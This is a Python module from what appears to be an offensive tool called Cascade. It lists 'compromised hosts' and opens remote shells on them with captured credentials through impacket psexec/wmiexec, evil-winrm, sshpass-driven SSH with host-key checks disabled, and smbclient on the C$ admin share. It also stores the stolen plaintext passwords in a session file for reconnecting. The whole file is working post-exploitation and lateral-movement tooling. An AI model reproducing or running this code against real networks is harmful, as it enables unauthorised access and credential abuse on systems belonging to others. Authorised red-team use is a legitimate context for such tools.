"""
shells.py — Interactive shell manager for Cascade
Detects available connection methods per host and launches them directly.
Persists sessions to disk for quick reconnect.
"""

import json, os, shutil, subprocess, time
from . import tui

SESSION_FILE = os.path.expanduser("~/.cascade_sessions.json")

# ── available connection methods ──────────────────────────────────────────────
#  Each method: (id, label, required_port, required_binary)
METHODS = [
    ("psexec",    "CMD shell        (psexec / SYSTEM)",   445,  "impacket-psexec"),
    ("wmiexec",   "CMD shell        (wmiexec / user)",    445,  "impacket-wmiexec"),
    ("winrm",     "PowerShell shell (evil-winrm)",        5985, "evil-winrm"),
    ("ssh",       "SSH shell",                            22,   "ssh"),
    ("smbclient", "Browse SMB files (smbclient)",         445,  "smbclient"),
]


def detect_methods(host: dict) -> list[tuple]:
    """Return methods that are both port-reachable and have the binary installed."""
    open_ports = set(host.get("ports") or [])
    available  = []
    for mid, label, port, binary in METHODS:
        if port in open_ports and shutil.which(binary):
            available.append((mid, label))
    return available


# ── session store ─────────────────────────────────────────────────────────────

def _load_sessions() -> list[dict]:
    if not os.path.exists(SESSION_FILE):
        return []
    try:
        return json.load(open(SESSION_FILE))
    except Exception:
        return []


def _save_session(entry: dict):
    sessions = _load_sessions()
    # Update existing or append
    for s in sessions:
        if s["ip"] == entry["ip"] and s["user"] == entry["user"]:
            s.update(entry)
            break
    else:
        sessions.append(entry)
    json.dump(sessions, open(SESSION_FILE, "w"), indent=2)


def _remove_session(ip: str, user: str):
    sessions = [s for s in _load_sessions()
                if not (s["ip"] == ip and s["user"] == user)]
    json.dump(sessions, open(SESSION_FILE, "w"), indent=2)


# ── shell launchers ───────────────────────────────────────────────────────────

def _launch(cmd: list[str], ip: str, method: str):
    """Hand control to an interactive subprocess."""
    tui.divider()
    tui.success(f"Connecting ({method}) → {ip}")
    tui.info("Type 'exit' to return to Cascade.\n")
    time.sleep(0.4)
    try:
        subprocess.call(cmd)
    except FileNotFoundError as e:
        tui.error(f"Binary not found: {e}")
    except KeyboardInterrupt:
        pass
    print()
    tui.info("Session ended.")


def connect(host: dict, cred: dict, method_id: str):
    ip   = host["ip"]
    user = cred["user"]
    pwd  = cred["secret"]

    if method_id == "psexec":
        _launch(["impacket-psexec", f"{user}:{pwd}@{ip}"], ip, "psexec")

    elif method_id == "wmiexec":
        _launch(["impacket-wmiexec", f"{user}:{pwd}@{ip}"], ip, "wmiexec")

    elif method_id == "winrm":
        _launch(["evil-winrm", "-i", ip, "-u", user, "-p", pwd], ip, "evil-winrm")

    elif method_id == "ssh":
        # Use sshpass if available for non-interactive password auth
        if shutil.which("sshpass"):
            _launch(["sshpass", "-p", pwd, "ssh",
                     "-o", "StrictHostKeyChecking=no", f"{user}@{ip}"], ip, "ssh")
        else:
            tui.info(f"sshpass not found — launching ssh (enter password manually: {tui.YLW}{pwd}{tui.R})")
            _launch(["ssh", "-o", "StrictHostKeyChecking=no", f"{user}@{ip}"], ip, "ssh")

    elif method_id == "smbclient":
        _launch(["smbclient", f"//{ip}/C$", "-U", f"{user}%{pwd}"], ip, "smbclient")


# ── session menus ─────────────────────────────────────────────────────────────

def _method_menu(host: dict, cred: dict):
    """Show available connection methods for a single host and connect."""
    methods = detect_methods(host)
    if not methods:
        tui.warn("No usable connection methods found for this host.")
        tui.info("Make sure impacket / evil-winrm / ssh are installed.")
        return

    ip       = host["ip"]
    hostname = host.get("hostname") or ""
    user     = cred["user"]

    while True:
        tui.clear()
        tui.print_banner()
        tui.phase(f"CONNECT  {ip}  ({hostname})  as {user}")

        for i, (mid, label) in enumerate(methods, 1):
            print(f"  {tui.RED}{tui.B}{i:>2}{tui.R}  {tui.WH}{label}{tui.R}")

        print(f"\n  {tui.DIM}   0 / Enter → back{tui.R}\n")

        raw = input(f"  {tui.WH}{tui.B}method → {tui.R}").strip()
        if raw in ("0", ""):
            return

        try:
            idx = int(raw) - 1
            if 0 <= idx < len(methods):
                mid, label = methods[idx]
                connect(host, cred, mid)
                # Save session after successful connection attempt
                _save_session({
                    "ip":       ip,
                    "hostname": hostname,
                    "user":     user,
                    "secret":   cred["secret"],
                    "methods":  [m[0] for m in methods],
                    "last":     time.strftime("%Y-%m-%d %H:%M"),
                })
        except (ValueError, IndexError):
            pass


def access_menu(compromised: list[dict]):
    """
    Main shell manager — shown after stage 5.
    compromised: list of { host: dict, cred: dict }
    """
    if not compromised:
        return

    while True:
        tui.clear()
        tui.print_banner()
        tui.phase("SHELL MANAGER — COMPROMISED HOSTS")

        for i, entry in enumerate(compromised, 1):
            h    = entry["host"]
            c    = entry["cred"]
            ip   = h["ip"]
            hn   = h.get("hostname") or ""
            user = c["user"]
            methods = [label for _, label in detect_methods(h)]
            m_str   = "  |  ".join(m.split("(")[0].strip() for m in methods) or "unknown"
            print(
                f"  {tui.RED}{tui.B}{i:>2}{tui.R}  "
                f"{tui.WH}{tui.B}{ip:<16}{tui.R}  "
                f"{tui.DIM}{hn:<20}{tui.R}  "
                f"{tui.YLW}{user:<16}{tui.R}  "
                f"{tui.DIM}{m_str}{tui.R}"
            )

        print(f"\n  {tui.DIM}   s  →  saved sessions   |   0 / Enter → back{tui.R}\n")

        raw = input(f"  {tui.WH}{tui.B}host → {tui.R}").strip().lower()

        if raw in ("0", ""):
            return
        if raw == "s":
            saved_menu()
            continue

        try:
            idx = int(raw) - 1
            if 0 <= idx < len(compromised):
                _method_menu(compromised[idx]["host"], compromised[idx]["cred"])
        except (ValueError, IndexError):
            pass


def saved_menu():
    """Browse and reconnect to previously saved sessions."""
    while True:
        sessions = _load_sessions()
        tui.clear()
        tui.print_banner()
        tui.phase("SAVED SESSIONS")

        if not sessions:
            tui.warn("No saved sessions yet.")
            input(f"\n  {tui.DIM}[ press Enter to go back ]{tui.R}")
            return

        for i, s in enumerate(sessions, 1):
            methods = "  |  ".join(s.get("methods") or [])
            print(
                f"  {tui.RED}{tui.B}{i:>2}{tui.R}  "
                f"{tui.WH}{tui.B}{s['ip']:<16}{tui.R}  "
                f"{tui.DIM}{s.get('hostname',''):<20}{tui.R}  "
                f"{tui.YLW}{s['user']:<16}{tui.R}  "
                f"{tui.DIM}{methods}{tui.R}  "
                f"{tui.DIM}{s.get('last','')}{tui.R}"
            )

        print(f"\n  {tui.DIM}   d<n>  →  delete session (e.g. d2)   |   0 / Enter → back{tui.R}\n")
        raw = input(f"  {tui.WH}{tui.B}session → {tui.R}").strip().lower()

        if raw in ("0", ""):
            return

        if raw.startswith("d"):
            try:
                idx = int(raw[1:]) - 1
                s   = sessions[idx]
                _remove_session(s["ip"], s["user"])
                tui.success(f"Removed session {s['ip']} / {s['user']}")
                time.sleep(0.8)
            except (ValueError, IndexError):
                pass
            continue

        try:
            idx = int(raw) - 1
            if 0 <= idx < len(sessions):
                s = sessions[idx]
                # Reconstruct minimal host/cred dicts from saved session
                host = {"ip": s["ip"], "hostname": s.get("hostname",""),
                        "ports": _ports_from_methods(s.get("methods", []))}
                cred = {"user": s["user"], "secret": s["secret"]}
                _method_menu(host, cred)
        except (ValueError, IndexError):
            pass


def _ports_from_methods(method_ids: list[str]) -> list[int]:
    """Reverse-map method IDs back to ports so detect_methods works on saved sessions."""
    port_map = {"psexec": 445, "wmiexec": 445, "winrm": 5985,
                "ssh": 22, "smbclient": 445}
    return list({port_map[m] for m in method_ids if m in port_map})
